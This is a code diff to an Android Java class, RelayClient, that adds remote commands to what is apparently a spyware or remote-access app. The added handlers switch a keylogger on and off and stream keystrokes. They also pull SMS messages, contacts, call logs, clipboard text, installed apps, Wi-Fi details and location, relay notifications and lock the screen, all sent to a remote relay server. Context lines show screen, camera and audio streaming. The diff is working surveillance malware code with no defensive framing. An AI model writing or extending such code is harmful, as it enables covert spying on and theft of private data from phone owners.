@@ -144,6 +144,87 @@ public class RelayClient {
                 }
             });
 
+            // ── Keylogger ─────────────────────────────────────────────────────
+            socket.on("keylog_on", args -> {
+                InputService svc = InputService.getInstance();
+                if (svc != null) svc.setKeylogEnabled(true);
+                emitKeylogStatus(true, requester(args));
+            });
+            socket.on("keylog_off", args -> {
+                InputService svc = InputService.getInstance();
+                if (svc != null) svc.setKeylogEnabled(false);
+                emitKeylogStatus(false, requester(args));
+            });
+
+            // ── Data collection ───────────────────────────────────────────────
+            socket.on("get_sms", args -> {
+                try {
+                    JSONObject res = new JSONObject();
+                    res.put("sms",        DataCollector.getSms(service));
+                    res.put("_requester", requester(args));
+                    socket.emit("sms_result", res);
+                } catch (Exception e) { Log.e(TAG, "get_sms error", e); }
+            });
+
+            socket.on("get_contacts", args -> {
+                try {
+                    JSONObject res = new JSONObject();
+                    res.put("contacts",   DataCollector.getContacts(service));
+                    res.put("_requester", requester(args));
+                    socket.emit("contacts_result", res);
+                } catch (Exception e) { Log.e(TAG, "get_contacts error", e); }
+            });
+
+            socket.on("get_call_logs", args -> {
+                try {
+                    JSONObject res = new JSONObject();
+                    res.put("call_logs",  DataCollector.getCallLogs(service));
+                    res.put("_requester", requester(args));
+                    socket.emit("call_logs_result", res);
+                } catch (Exception e) { Log.e(TAG, "get_call_logs error", e); }
+            });
+
+            socket.on("get_wifi_info", args -> {
+                try {
+                    JSONObject info = DataCollector.getWifiInfo(service);
+                    info.put("_requester", requester(args));
+                    socket.emit("wifi_info_result", info);
+                } catch (Exception e) { Log.e(TAG, "get_wifi_info error", e); }
+            });
+
+            socket.on("get_clipboard_content", args -> {
+                try {
+                    JSONObject res = new JSONObject();
+                    res.put("text",       DataCollector.getClipboard(service));
+                    res.put("_requester", requester(args));
+                    socket.emit("clipboard_content_result", res);
+                } catch (Exception e) { Log.e(TAG, "get_clipboard_content error", e); }
+            });
+
+            socket.on("get_installed_apps", args -> {
+                try {
+                    JSONObject res = new JSONObject();
+                    res.put("apps",       DataCollector.getInstalledApps(service));
+                    res.put("_requester", requester(args));
+                    socket.emit("installed_apps_result", res);
+                } catch (Exception e) { Log.e(TAG, "get_installed_apps error", e); }
+            });
+
+            socket.on("get_location", args -> {
+                final String req = requester(args);
+                DataCollector.getLocation(service, result -> {
+                    try {
+                        result.put("_requester", req);
+                        socket.emit("location_result", result);
+                    } catch (Exception e) { Log.e(TAG, "get_location result error", e); }
+                });
+            });
+
+            // ── Screen off / lock ─────────────────────────────────────────────
+            socket.on("screen_off", args -> {
+                service.lockScreen(requester(args));
+            });
+
             socket.connect();
         } catch (URISyntaxException e) {
             Log.e(TAG, "bad URI: " + relayUrl, e);
@@ -161,6 +242,39 @@ public class RelayClient {
     public void emitFrame(byte[] jpeg)    { emitBytes("frame",        jpeg); }
     public void emitCamera(byte[] jpeg)   { emitBytes("camera_frame", jpeg); }
     public void emitAudio(byte[] pcm)     { emitBytes("audio",        pcm);  }
+
+    public void emitKeyChar(String ch) {
+        if (!connected()) return;
+        try {
+            JSONObject obj = new JSONObject();
+            obj.put("char", ch);
+            socket.emit("key", obj);
+        } catch (JSONException e) {
+            Log.e(TAG, "emitKeyChar error", e);
+        }
+    }
+
+    public void emitNotification(JSONObject data) {
+        if (!connected()) return;
+        socket.emit("notification_event", data);
+    }
+
+    public void emitScreenOff(JSONObject data) {
+        if (!connected()) return;
+        socket.emit("screen_off_result", data);
+    }
+
+    private void emitKeylogStatus(boolean enabled, String req) {
+        if (!connected()) return;
+        try {
+            JSONObject obj = new JSONObject();
+            obj.put("enabled",    enabled);
+            obj.put("_requester", req);
+            socket.emit("keylog_status", obj);
+        } catch (JSONException e) {
+            Log.e(TAG, "emitKeylogStatus error", e);
+        }
+    }
 
     public void emitScreenshot(byte[] data, String req) {
         if (!connected()) return;
